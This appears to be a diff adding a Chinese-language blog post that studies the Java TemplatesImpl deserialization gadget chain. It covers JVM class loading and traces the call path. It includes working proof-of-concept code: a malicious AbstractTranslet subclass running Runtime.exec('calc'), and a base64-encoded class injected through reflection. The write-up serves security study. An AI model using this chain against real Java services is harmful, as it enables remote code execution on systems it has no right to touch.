@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Dawn Nine学习笔记
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Dawn Nine,代码学习 >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            TemplatesImpl利用链
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="TemplatesImpl链分析"><a href="#TemplatesImpl链分析" class="headerlink" title="TemplatesImpl链分析"></a>TemplatesImpl链分析</h1><blockquote>
+<p>从<a href="https://dawnnine.github.io/2025/12/25/CC%E6%80%BB%E7%BB%93/">CC</a>图中可以看到一共有两条链子用到了TemplatesImpl类，在我分析ysoserial源码时，发现实际CC2链路还可有其他利用方式链路。</p>
+</blockquote>
+<h2 id="TemplatesImpl类分析"><a href="#TemplatesImpl类分析" class="headerlink" title="TemplatesImpl类分析"></a>TemplatesImpl类分析</h2><p>​	TemplateImpl类通常与模板引擎和设计模式相关联。TemplateImpl类中有一个TransletClassLoader.loadClass()函数重写了ClassLoader.loadClass()函数。这个函数是用来加载对应类名的class文件，可以先来看一下jvm虚拟机对类的处理。</p>
+<h2 id="JVM虚拟机对类处理"><a href="#JVM虚拟机对类处理" class="headerlink" title="JVM虚拟机对类处理"></a>JVM虚拟机对类处理</h2><p>​	分为二个阶段<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000037574626">详细可以看一下这个</a><br><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/view.png" alt="preview">	<br>​	1、Java源文件：java文件首先由javac进行编译成class文件，字节码文件。<br>​	2、类加载阶段：加载-&gt;连接[验证-&gt;准备-&gt;解析]-&gt;初始化<br><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/view-1771143436429-3.png" alt="preview"></p>
+<p>在<code>加载</code>的过程中有一个ClassLoader类是核心，主要作用1、负责将 Class 加载到 JVM 中；2、审查每个类由谁加载（父优先的等级加载机制）；3、将 Class 字节码重新解析成 JVM 统一要求的对象格式</p>
+<h3 id="加载器分类"><a href="#加载器分类" class="headerlink" title="加载器分类"></a>加载器分类</h3><p>jvm虚拟机内置了三个类加载器</p>
+<ul>
+<li><p>​	BootStrap ClassLoader(称为启动类加载器)，是Java类加载层次中最顶层的类加载器，**负责加载JDK中的核心类库。</p>
+</li>
+<li><p>​	ExtensionClassLoader(扩展类加载器)：主要负责加载 %JRE_HOME%&#x2F;lib&#x2F;ext 目录下的 jar 包和类以及被 java.ext.dirs 系统变量所指定的路径下的所有类。</p>
+</li>
+<li><p>​	AppClassLoader(应用程序类加载器)：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。</p>
+</li>
+</ul>
+<p>除了这三种类加载器之外，还可以自定义类加载器(UserDefineClassLoader)，通过继承java.lang.ClassLoader类重写findClass()方法来实现自定义类加载器。</p>
+<h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>在jvm虚拟机处理完全遵循<strong>双亲委派模型</strong>。大概意思就是如果一个类加载器收到了类加载请求，首先会把这个请求委派给父类加载器加载，只有父类加载器无法完成类加载请求时，子类加载器才会尝试自己去加载。</p>
+<p><img src="https://oss.javaguide.cn/github/javaguide/java/jvm/class-loader-parents-delegation-model.png" alt="类加载器层次关系图"></p>
+<h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><h3 id="ClassLoader关键函数"><a href="#ClassLoader关键函数" class="headerlink" title="ClassLoader关键函数"></a>ClassLoader关键函数</h3><ul>
+<li>defineClass(byte[], int, int) 把字节数组 b中的内容转换成 Java 类，返回的结果是java.lang.Class类的实<br>例。这个方法被声明为final的</li>
+<li>findClass(String name) 查找名称为 name的类，返回的结果是java.lang.Class类的实例</li>
+<li>loadClass(String name) 加载名称为 name的类，返回的结果是java.lang.Class类的实例</li>
+<li>resolveClass(Class&lt;?&gt;) 链接指定的 Java 类</li>
+</ul>
+<p>首先准备好一个要加载的类直接javac编译，编译后生成calc类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再自定义一个类加载器TestClassLoader</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)  &#123;</span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] classData = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                classData = Files.readAllBytes(Paths.get(name));</span><br><span class="line">                System.out.println(classData);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            c = defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后写进行LoadTestClass类进行加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadTestClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line">        Class&lt;?&gt; testCtClass = classLoader.loadClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	按照上面的图解意思，<del>在执行加载的时候calc类会自动进行初始化</del>，错的因为这个加载是jvm进行转化<code>加载二进制数据到内存</code> —&gt; <code>映射成jvm能识别的结构</code> —&gt; <code>在内存中生成class文件</code>，非类加载具体可以看一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17051693.html">selzer</a>师傅写的。</p>
+<p>​	类的初始化大概分为三种1、静态初始化；2、匿名初始化；3、构造方法初始化。其中静态初始化是在对类加载的过程中就会进行，它是条件最简单的初始化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classLoader.loadClass(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​	当执行这句的时候应该会进行静态初始化，因为我们把calc弹计算器的命令放到了static中。执行后发现没有弹出计算器</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216111322627.png" alt="image-20260216111322627"></p>
+<p>从源码分析我们重写的是Classloader.loadClass函数，是因为这个过程中并不包括初始化操作，所以就不会执行静态代码块。TemplatesImpl类同样也是重新的这个，所以需要对其进行初始化才能进行操作。</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216111416041.png" alt="image-20260216111416041"></p>
+<p>添加testCtClass.getConstructor().newInstance();通过反射获得无参构造，再进行实例。成功弹出计算器</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216111819097.png" alt="image-20260216111819097"></p>
+<h2 id="TemplatesImpl中的loadClass利用"><a href="#TemplatesImpl中的loadClass利用" class="headerlink" title="TemplatesImpl中的loadClass利用"></a>TemplatesImpl中的loadClass利用</h2><p>​	在TemplatesImpl中有一个TransletClassLoader.loadClass方法，这个方法是重写的上面说的ClassLoader.loadClass方法。</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216135721602.png" alt="image-20260216135721602"></p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216111416041.png" alt="image-20260216111416041"></p>
+<p>​	所以说现在sink点已经找到了，刚才可知1、要找调用的点；2、要进行实例化才能调用start里面的代码；3、找到方法熟悉为public。开始跟踪利用链。由defineTransletClasses()调用</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216140156015.png" alt="image-20260216140156015"></p>
+<p>​	defineTransletClasses()由非public属性getTransletInstance()调用，同时455行，进行了实例化，如果这个是public那么就可以结束。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216140425365.png" alt="image-20260216140425365"></p>
+<p>newTransformer()函数调用了getTransletInstance()同时属性为public。</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216141517906.png" alt="image-20260216141517906"></p>
+<p>​	利用链</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216143658949.png" alt="image-20260216143658949"></p>
+<p>开始写classloader恶意类test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据网上公开的exp直接把里面的代码换成我class文件bsea64编码的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAAR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后发现报错</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216144631963.png" alt="image-20260216144631963"></p>
+<p>单步断点调试发现，在运行到这一步代码的时候报错，if来判断你是否继承了com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以恶意类要继承AbstractTranslet，并且要重新transform方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplEvil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM var1, SerializationHandler[] var2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM var1, DTMAxisIterator var2, SerializationHandler var3)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更换base64代码后进行执行，成功弹出。</p>
+<p><img src="/2026/02/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/image-20260216145030940.png" alt="image-20260216145030940"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	链子分析没多难，难点在于JVM类的加载有点抽象ClassLoader类也是第一次接触。尤其是在研究ClassLoader类中的findClass函数，死活也走不进去自定义的加载器中（解决了）。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000037574626">https://segmentfault.com/a/1190000037574626</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17064102.html">https://www.cnblogs.com/seizer/p/17064102.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11531">https://xz.aliyun.com/news/11531</a></p>
+</blockquote>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Dawn Nine | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
